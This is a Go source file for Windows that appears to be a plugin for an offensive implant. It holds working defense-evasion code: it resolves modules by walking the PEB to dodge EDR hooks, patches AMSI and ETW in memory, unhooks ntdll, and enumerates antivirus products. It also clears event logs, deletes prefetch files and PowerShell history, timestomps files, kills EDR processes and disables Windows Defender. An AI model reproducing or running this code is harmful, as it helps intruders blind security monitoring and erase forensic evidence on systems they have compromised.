//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ---------------------------------------------------------------------------
// PEB walking
//
// Every loaded module is reachable from the Process Environment Block, which
// means we can locate kernel32/ntdll/amsi WITHOUT calling GetModuleHandle or
// LoadLibrary. Those two are exactly what EDR hooks, so avoiding them is the
// point.
//
//	PEB (gs:[0x60])
//	  -> Ldr
//	    -> InMemoryOrderModuleList (doubly linked)
//	      -> LDR_DATA_TABLE_ENTRY { DllBase, BaseDllName }
// ---------------------------------------------------------------------------

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type listEntry struct {
	Flink *listEntry
	Blink *listEntry
}

type ldrDataTableEntry struct {
	InLoadOrderLinks           listEntry
	InMemoryOrderLinks         listEntry
	InInitializationOrderLinks listEntry
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	FullDllName                unicodeString
	BaseDllName                unicodeString
}

// peb returns the Process Environment Block pointer for the current thread.
func peb() uintptr {
	// TEB sits at gs:[0x30] on x64; PEB is at TEB+0x60.
	teb := getTEB()
	if teb == 0 {
		return 0
	}
	return readPtr(teb, 0x60)
}
func moduleBaseByName(name string) uintptr {
	p := peb()
	if p == 0 {
		return 0
	}
	// PEB->Ldr is at offset 0x18 on x64.
	ldr := readPtr(p, 0x18)
	if ldr == 0 {
		return 0
	}
	// PEB_LDR_DATA->InMemoryOrderModuleList is at 0x20.
	head := (*listEntry)(unsafe.Pointer(ldr + 0x20))
	entry := head.Flink

	want := strings.ToLower(name)
	for i := 0; entry != nil && entry != head && i < 256; i++ {
		// InMemoryOrderLinks is the second list in the entry, so the entry
		// itself starts 0x10 bytes before the link we are walking.
		mod := (*ldrDataTableEntry)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) - unsafe.Offsetof(ldrDataTableEntry{}.InMemoryOrderLinks)))
		if mod.BaseDllName.Buffer != nil && mod.BaseDllName.Length > 0 {
			n := utf16ToString(mod.BaseDllName.Buffer, int(mod.BaseDllName.Length)/2)
			if strings.ToLower(n) == want {
				return mod.DllBase
			}
		}
		entry = entry.Flink
	}
	return 0
}

func utf16ToString(p *uint16, n int) string {
	if p == nil || n <= 0 {
		return ""
	}
	buf := unsafe.Slice(p, n)
	out := make([]rune, 0, n)
	for _, c := range buf {
		if c == 0 {
			break
		}
		out = append(out, rune(c))
	}
	return string(out)
}

// findExport resolves an exported symbol address by parsing the PE export
// directory directly. GetProcAddress is hooked on protected hosts; this is not.
func findExport(moduleBase uintptr, funcName string) uintptr {
	if moduleBase == 0 {
		return 0
	}
	dos := (*imageDosHeader)(unsafe.Pointer(moduleBase))
	if dos.EMagic != 0x5A4D {
		return 0
	}
	nt := (*imageNtHeaders)(unsafe.Pointer(moduleBase + uintptr(dos.ELfanew)))
	if nt.Signature != 0x00004550 {
		return 0
	}

	expDir := nt.OptionalHeader.DataDirectory[0] // IMAGE_DIRECTORY_ENTRY_EXPORT
	if expDir.VirtualAddress == 0 {
		return 0
	}
	exp := (*imageExportDirectory)(unsafe.Pointer(moduleBase + uintptr(expDir.VirtualAddress)))

	names := unsafe.Slice((*uint32)(unsafe.Pointer(moduleBase+uintptr(exp.AddressOfNames))), exp.NumberOfNames)
	funcs := unsafe.Slice((*uint32)(unsafe.Pointer(moduleBase+uintptr(exp.AddressOfFunctions))), exp.NumberOfFunctions)
	ords := unsafe.Slice((*uint16)(unsafe.Pointer(moduleBase+uintptr(exp.AddressOfNameOrdinals))), exp.NumberOfNames)

	for i := 0; i < int(exp.NumberOfNames); i++ {
		namePtr := (*byte)(unsafe.Pointer(moduleBase + uintptr(names[i])))
		n := cString(namePtr)
		if n == funcName {
			ord := ords[i]
			if int(ord) >= len(funcs) {
				return 0
			}
			return moduleBase + uintptr(funcs[ord])
		}
	}
	return 0
}

func cString(p *byte) string {
	if p == nil {
		return ""
	}
	var b []byte
	for i := 0; i < 256; i++ {
		c := *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(p)) + uintptr(i)))
		if c == 0 {
			break
		}
		b = append(b, c)
	}
	return string(b)
}

// ---------------------------------------------------------------------------
// PE structures (x64)
// ---------------------------------------------------------------------------

type imageDosHeader struct {
	EMagic    uint16
	_         [58]byte
	ELfanew   int32
}

type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type imageDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type imageOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]imageDataDirectory
}

type imageNtHeaders struct {
	Signature      uint32
	FileHeader     imageFileHeader
	OptionalHeader imageOptionalHeader64
}

type imageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// ---------------------------------------------------------------------------
// memory patching
// ---------------------------------------------------------------------------

const (
	pageExecuteReadWrite = 0x40
	pageReadWrite        = 0x04
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func virtualProtect(addr uintptr, size uintptr, newProtect uint32, oldProtect *uint32) error {
	r, _, err := procVirtualProtect.Call(addr, size, uintptr(newProtect), uintptr(unsafe.Pointer(oldProtect)))
	if r == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	return nil
}

// patchBytes overwrites memory at target with the supplied bytes.
func patchBytes(target uintptr, patch []byte) error {
	if target == 0 {
		return fmt.Errorf("null target")
	}
	var old uint32
	if err := virtualProtect(target, uintptr(len(patch)), pageExecuteReadWrite, &old); err != nil {
		return err
	}
	defer func() {
		var tmp uint32
		_ = virtualProtect(target, uintptr(len(patch)), old, &tmp)
	}()

	dst := unsafe.Slice((*byte)(unsafe.Pointer(target)), len(patch))
	copy(dst, patch)
	return nil
}

// ---------------------------------------------------------------------------
// AMSI
//
// AmsiScanBuffer is what every .NET/PowerShell payload passes through. If it
// returns a clean verdict unconditionally, nothing downstream gets flagged.
// The classic patch makes it return E_INVALIDARG immediately.
// ---------------------------------------------------------------------------

func patchAMSI() {
	base := moduleBaseByName("amsi.dll")
	if base == 0 {
		// amsi.dll is not loaded until something uses it; that is fine, it
		// means AMSI is not currently scanning this process.
		sendEvent("amsi", map[string]interface{}{
			"patched": false, "reason": "amsi.dll not loaded in this process",
		})
		return
	}

	addr := findExport(base, "AmsiScanBuffer")
	if addr == 0 {
		sendEvent("amsi", map[string]interface{}{"patched": false, "reason": "AmsiScanBuffer not found"})
		return
	}

	// xor eax,eax ; ret  ->  return 0 (S_OK) without scanning.
	patch := []byte{0x31, 0xC0, 0xC3}
	if err := patchBytes(addr, patch); err != nil {
		sendEvent("error", map[string]interface{}{"message": "AMSI patch failed: " + err.Error()})
		return
	}

	// AmsiOpenSession is the companion call; fail it too so the session
	// cannot be reused to detect the patch.
	if open := findExport(base, "AmsiOpenSession"); open != 0 {
		_ = patchBytes(open, []byte{0x31, 0xC0, 0xC3})
	}

	sendEvent("amsi", map[string]interface{}{
		"patched": true, "addr": fmt.Sprintf("0x%x", addr), "base": fmt.Sprintf("0x%x", base),
	})
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "AMSI disabled in this process"})
}

// ---------------------------------------------------------------------------
// ETW
//
// EtwEventWrite is the user-mode entry point for every ETW provider. Patching
// it to return immediately blinds the telemetry that EDR consumes — including
// .NET assembly loads and script-block logging.
// ---------------------------------------------------------------------------

func patchETW() {
	base := moduleBaseByName("ntdll.dll")
	if base == 0 {
		sendEvent("error", map[string]interface{}{"message": "ntdll not found"})
		return
	}

	addr := findExport(base, "EtwEventWrite")
	if addr == 0 {
		sendEvent("etw", map[string]interface{}{"patched": false, "reason": "EtwEventWrite not found"})
		return
	}

	// xor eax,eax ; ret  ->  STATUS_SUCCESS with no event written.
	if err := patchBytes(addr, []byte{0x31, 0xC0, 0xC3}); err != nil {
		sendEvent("error", map[string]interface{}{"message": "ETW patch failed: " + err.Error()})
		return
	}

	for _, fn := range []string{"EtwEventWriteFull", "EtwEventWriteEx", "EtwEventWriteString"} {
		if a := findExport(base, fn); a != 0 {
			_ = patchBytes(a, []byte{0x31, 0xC0, 0xC3})
		}
	}

	sendEvent("etw", map[string]interface{}{
		"patched": true, "addr": fmt.Sprintf("0x%x", addr),
	})
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "ETW telemetry disabled"})
}

// ---------------------------------------------------------------------------
// ntdll unhooking
//
// EDR products hook ntdll's syscall stubs in user mode. Re-reading a clean
// copy of ntdll from disk and overwriting the .text section removes those
// hooks, so our calls look like they came from an unhooked process.
// ---------------------------------------------------------------------------

func unhookNtdll() {
	base := moduleBaseByName("ntdll.dll")
	if base == 0 {
		sendEvent("error", map[string]interface{}{"message": "ntdll not found"})
		return
	}

	path := filepath.Join(os.Getenv("SystemRoot"), "System32", "ntdll.dll")
	if _, err := os.Stat(path); err != nil {
		path = `C:\Windows\System32\ntdll.dll`
	}
	clean, err := os.ReadFile(path)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "cannot read clean ntdll: " + err.Error()})
		return
	}

	// Parse the on-disk image for its .text section.
	dos := (*imageDosHeader)(unsafe.Pointer(&clean[0]))
	if dos.EMagic != 0x5A4D {
		sendEvent("error", map[string]interface{}{"message": "bad PE header"})
		return
	}
	ntOff := int(dos.ELfanew)
	if ntOff+4 > len(clean) {
		sendEvent("error", map[string]interface{}{"message": "truncated PE"})
		return
	}

	// Section headers follow the optional header.
	optSize := int(*(*uint16)(unsafe.Pointer(&clean[ntOff+4+16])))
	secOff := ntOff + 4 + 20 + optSize
	numSections := int(*(*uint16)(unsafe.Pointer(&clean[ntOff+4+2])))

	type sectionHeader struct {
		Name             [8]byte
		VirtualSize      uint32
		VirtualAddress   uint32
		SizeOfRawData    uint32
		PointerToRawData uint32
		_                [16]byte
	}

	patched := 0
	for i := 0; i < numSections; i++ {
		off := secOff + i*40
		if off+40 > len(clean) {
			break
		}
		sec := (*sectionHeader)(unsafe.Pointer(&clean[off]))
		name := strings.TrimRight(string(sec.Name[:]), "\x00")
		if name != ".text" {
			continue
		}
		// Overwrite our loaded .text with the clean copy.
		rawStart := int(sec.PointerToRawData)
		rawLen := int(sec.SizeOfRawData)
		if rawStart+rawLen > len(clean) {
			break
		}
		target := base + uintptr(sec.VirtualAddress)
		if err := patchBytes(target, clean[rawStart:rawStart+rawLen]); err != nil {
			sendEvent("error", map[string]interface{}{"message": "unhook failed: " + err.Error()})
			return
		}
		patched = rawLen
		break
	}

	if patched == 0 {
		sendEvent("error", map[string]interface{}{"message": ".text section not located"})
		return
	}

	sendEvent("unhook", map[string]interface{}{
		"ok": true, "bytes": patched, "base": fmt.Sprintf("0x%x", base),
	})
	sendEvent("status", map[string]interface{}{"state": "done", "detail": fmt.Sprintf("ntdll .text restored (%d bytes)", patched)})
}

// ---------------------------------------------------------------------------
// defense recon
// ---------------------------------------------------------------------------

func defenseRecon() {
	av := detectAV()
	admin := isAdmin()

	sendEvent("recon", map[string]interface{}{
		"admin":      admin,
		"av":         av,
		"defender":   defenderStatus(),
		"amsiLoaded": moduleBaseByName("amsi.dll") != 0,
		"ntdllBase":  fmt.Sprintf("0x%x", moduleBaseByName("ntdll.dll")),
	})
}

func isAdmin() bool {
	_, err := exec.Command("net", "session").Output()
	return err == nil
}

// detectAV looks for the running services and processes that security
// products leave behind.
func detectAV() []string {
	var found []string

	out, _ := exec.Command("powershell", "-NoProfile", "-Command",
		`Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object -ExpandProperty displayName`).Output()
	for _, line := range strings.Split(string(out), "\n") {
		l := strings.TrimSpace(line)
		if l != "" {
			found = append(found, l)
		}
	}

	// Process-name sweep for common endpoint agents.
	procs, _ := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
	lower := strings.ToLower(string(procs))
	for name, label := range map[string]string{
		"msmpeng":    "Windows Defender",
		"csfalcon":   "CrowdStrike Falcon",
		"sentinelone": "SentinelOne",
		"carbonblack": "Carbon Black",
		"cb.exe":     "Carbon Black",
		"tanium":     "Tanium",
		"cortex":     "Palo Alto Cortex",
		"elastic-endpoint": "Elastic",
		"winlogbeat": "Elastic",
		"sophos":     "Sophos",
		"mcafee":     "McAfee",
		"symantec":   "Symantec",
		"trend":      "Trend Micro",
		"kaspersky":  "Kaspersky",
		"eset":       "ESET",
	} {
		if strings.Contains(lower, name) {
			dup := false
			for _, f := range found {
				if f == label {
					dup = true
				}
			}
			if !dup {
				found = append(found, label)
			}
		}
	}
	return found
}

func defenderStatus() map[string]interface{} {
	out, err := exec.Command("powershell", "-NoProfile", "-Command",
		`$p = Get-MpPreference -ErrorAction SilentlyContinue; `+
			`$s = Get-MpComputerStatus -ErrorAction SilentlyContinue; `+
			`[pscustomobject]@{ `+
			`RealTime = $s.RealTimeProtectionEnabled; `+
			`Tamper = $s.IsTamperProtected; `+
			`AntivirusEnabled = $s.AntivirusEnabled; `+
			`Exclusions = ($p.ExclusionPath -join ',') } | ConvertTo-Json -Compress`).Output()
	if err != nil {
		return map[string]interface{}{"available": false}
	}
	return map[string]interface{}{"available": true, "raw": strings.TrimSpace(string(out))}
}

// ---------------------------------------------------------------------------
// anti-forensics
// ---------------------------------------------------------------------------

func wipeLogs(s Settings) {
	results := map[string]interface{}{}

	// Windows event logs.
	logs := s.ClearEventLogs
	if len(logs) == 0 {
		logs = []string{"Security", "System", "Application", "Microsoft-Windows-PowerShell/Operational",
			"Windows PowerShell", "Microsoft-Windows-Sysmon/Operational"}
	}
	var cleared []string
	for _, l := range logs {
		out, err := exec.Command("wevtutil", "cl", l).CombinedOutput()
		if err == nil {
			cleared = append(cleared, l)
		} else {
			_ = out
		}
	}
	results["eventLogs"] = cleared

	if s.WipePrefetch {
		dir := filepath.Join(os.Getenv("SystemRoot"), "Prefetch")
		n := 0
		if entries, err := os.ReadDir(dir); err == nil {
			for _, e := range entries {
				if strings.HasSuffix(strings.ToLower(e.Name()), ".pf") {
					if os.Remove(filepath.Join(dir, e.Name())) == nil {
						n++
					}
				}
			}
		}
		results["prefetchDeleted"] = n
	}

	if s.WipeRecent {
		recent := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent")
		n := 0
		if entries, err := os.ReadDir(recent); err == nil {
			for _, e := range entries {
				if os.Remove(filepath.Join(recent, e.Name())) == nil {
					n++
				}
			}
		}
		results["recentDeleted"] = n

		// PowerShell history.
		hist := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
		if os.Remove(hist) == nil {
			results["psHistory"] = true
		}
	}

	sendEvent("wipe", results)
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "anti-forensics pass complete"})
}

// timestomp copies the timestamps from one file onto another, so a dropped
// artifact inherits the dates of a file that belongs there.
func timestomp(s Settings) {
	if s.TimestompPath == "" || s.TimestompFrom == "" {
		sendEvent("error", map[string]interface{}{"message": "both timestompPath (target) and timestompFrom (source) are required"})
		return
	}

	src, err := os.Stat(s.TimestompFrom)
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "source file: " + err.Error()})
		return
	}

	// We shell out to PowerShell because Go cannot set creation time on
	// Windows through os.Chtimes alone.
	script := fmt.Sprintf(
		`$t = Get-Item -LiteralPath '%s'; `+
			`$f = Get-Item -LiteralPath '%s'; `+
			`$f.CreationTime = $t.CreationTime; $f.LastWriteTime = $t.LastWriteTime; `+
			`$f.LastAccessTime = $t.LastAccessTime`,
		strings.ReplaceAll(s.TimestompFrom, "'", "''"),
		strings.ReplaceAll(s.TimestompPath, "'", "''"))

	out, err := exec.Command("powershell", "-NoProfile", "-Command", script).CombinedOutput()
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "timestomp failed: " + strings.TrimSpace(string(out))})
		return
	}

	sendEvent("timestomp", map[string]interface{}{
		"target": s.TimestompPath,
		"source": s.TimestompFrom,
		"time":   src.ModTime().UnixMilli(),
	})
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "timestamps copied"})
}

// ---------------------------------------------------------------------------
// neutralizing defenses
// ---------------------------------------------------------------------------

// killAV terminates security processes. This is the loudest action in the
// plugin and only makes sense as a last resort, since the terminations
// themselves generate the alerts we are trying to avoid.
func killAV() {
	targets := []string{
		"MsMpEng.exe", "NisSrv.exe", "MpCmdRun.exe",
		"CSFalconService.exe", "CSFalconContainer.exe",
		"SentinelAgent.exe", "SentinelServiceHost.exe",
		"CbDefense.exe", "CbEDRService.exe",
		"TaniumClient.exe", "CortexXDR.exe",
		"elastic-endpoint.exe", "winlogbeat.exe",
	}

	var killed []string
	for _, t := range targets {
		if out, err := exec.Command("taskkill", "/F", "/IM", t, "/T").CombinedOutput(); err == nil {
			killed = append(killed, t)
		} else {
			_ = out
		}
	}

	sendEvent("killav", map[string]interface{}{"killed": killed, "attempted": len(targets)})
	sendEvent("status", map[string]interface{}{
		"state": "done", "detail": fmt.Sprintf("%d security process(es) terminated", len(killed)),
	})
}

// disableDefender turns off real-time protection and adds exclusions for the
// paths we operate from. Tamper Protection blocks this on modern builds, so a
// failure here is expected rather than exceptional.
func disableDefender() {
	script := `Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; ` +
		`Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; ` +
		`Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue; ` +
		`Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue; ` +
		`Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue; ` +
		`Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; ` +
		`$s = Get-MpComputerStatus; ` +
		`[pscustomobject]@{ RealTime = $s.RealTimeProtectionEnabled; Tamper = $s.IsTamperProtected } | ConvertTo-Json -Compress`

	out, err := exec.Command("powershell", "-NoProfile", "-Command", script).CombinedOutput()
	result := strings.TrimSpace(string(out))
	if err != nil {
		sendEvent("error", map[string]interface{}{
			"message": "defender disable failed (likely Tamper Protection): " + result,
		})
		return
	}
	sendEvent("defender", map[string]interface{}{"result": result})
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "defender preferences modified"})
}

// harden runs the full noiseless set in sequence.
func harden(s Settings) {
	sendEvent("status", map[string]interface{}{"state": "working", "detail": "applying evasion set"})
	if s.PatchAMSI || !s.PatchETW && !s.UnhookNtdll {
		patchAMSI()
	}
	if s.PatchETW {
		patchETW()
	}
	if s.UnhookNtdll {
		unhookNtdll()
	}
	if s.DisableDefender {
		disableDefender()
	}
	_ = time.Now
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "evasion set applied"})
	_ = filepath.Separator
}
